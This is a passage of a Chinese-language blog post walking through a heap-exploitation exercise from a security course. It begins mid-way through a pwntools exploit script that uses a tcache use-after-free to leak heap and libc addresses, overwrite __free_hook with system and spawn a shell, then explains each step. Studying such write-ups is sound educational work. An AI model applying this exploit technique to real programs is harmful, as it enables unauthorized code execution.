class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># num = 4</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment"># num = 3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">fd_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = fd_addr - <span class="number">0x001680</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fd------------&gt;&quot;</span>,<span class="built_in">hex</span>(fd_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base-----&gt;&quot;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 3 num = 4</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 4 num = 5</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 5 num = 6 heap_base + 0x10 申请这个地方的</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 6 num = 7 </span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">1</span>)+<span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment"># num = 6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 6 num = 7</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 7 num = 8 heap_base + 0x30 申请这个地方的</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 8 num = 9</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x8</span>,p64(<span class="number">0x07000000</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment"># num = 8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment">#从unsortedbin上切割0x10大小 # 8 num = 9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">fd = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fd------------&gt;&quot;</span>,<span class="built_in">hex</span>(fd))</span><br><span class="line">libc = fd - <span class="number">0x3ebee0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc----------&gt;&quot;</span>,<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">system_addr = libc + <span class="number">0x4f420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr---&gt;&quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">free_hook_off = <span class="number">0x3ed8e8</span></span><br><span class="line">free_hook_addr = libc + free_hook_off</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook_addr&gt;&quot;</span>,<span class="built_in">hex</span>(free_hook_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x8</span>,p64(<span class="number">1</span>))</span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># num = 8</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,p64(free_hook_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 8 num = 9</span></span><br><span class="line">create(<span class="number">0x10</span>) <span class="comment"># 9 num = 10 __free_hook申请到了</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">0x8</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先呢，我们先申请5个0x10的堆空间：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/4.png" alt="4"></p>
+<p>然后free掉第一块和第二块：<img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/5.png" alt="5"></p>
+<p>此时我们free的第二块堆就有fd指针了，我们可以将其泄露，从而得到heap的基地址：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/6.png" alt="6"></p>
+<p>得到heap的基地址，我们就可以开始编辑第一块堆块，写入p64(heap_base+0x10)，为啥要加0x10，因为写入的第一块堆已经被free，所以此时写入的数据便是fd指针，而tcachebins的fd指针指向chunk的data区域：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/7.png" alt="7"></p>
+<p>可以看到，第一块被free的堆已经指向了我们想让其指向的地方，我们控制了tcache堆的一部分，我们再申请四个0x10大小的堆，此时我们便可以控制住heap_base堆块：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/8.png" alt="8"></p>
+<p>接下来，我们编辑第6块堆，并发送p64(1)+b”A”*(0x18)，为啥发1，等会你就知道了，我们再删去第四块堆，并编辑第四块堆，使其fd指针指向我们想要其指向的区域：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/9.png" alt="9"></p>
+<p>发1是因为，我们只删除了一块堆，但是我们要再构造一块删除的堆，发1这样的话，0x20这里的堆的数量就对了，不会出现报错的情况，我们再申请三块0x10，将我们要的地方申请过来，并编辑这一块发送0x07000000：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/10.png"></p>
+<p>嘿嘿，为啥发送0x07000000,当然是为了将记录0x250大小堆块的个数填为7，这样下次free大小为0x250的堆块，就不用进入tcachebins，那从哪里找0x250大小的堆呢，嘻嘻，看来是你忘了tcache堆的大小：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/11.png" alt="11"></p>
+<p>我们free第6块堆：<img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/12.png" alt="12"></p>
+<p>再次申请0x10，此时将从unsortedbin上切割，那必然存在fd指针残留，我们泄露出来，便可以获得libc的基地址：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/13.png" alt="13"></p>
+<p>over，接下里如法炮制，就可以修改free_hook了，取得shell：</p>
+<p><img src="/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/14.png" alt="14"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">看雪大佬公开课-例题详解</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&text=看雪大佬公开课-例题详解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&is_video=false&description=看雪大佬公开课-例题详解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=看雪大佬公开课-例题详解&body=Check out this article: http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&title=看雪大佬公开课-例题详解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&name=看雪大佬公开课-例题详解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/12/%E7%9C%8B%E9%9B%AA%E5%A4%A7%E4%BD%AC%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BE%8B%E9%A2%98%E8%AF%A6%E8%A7%A3/&t=看雪大佬公开课-例题详解"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
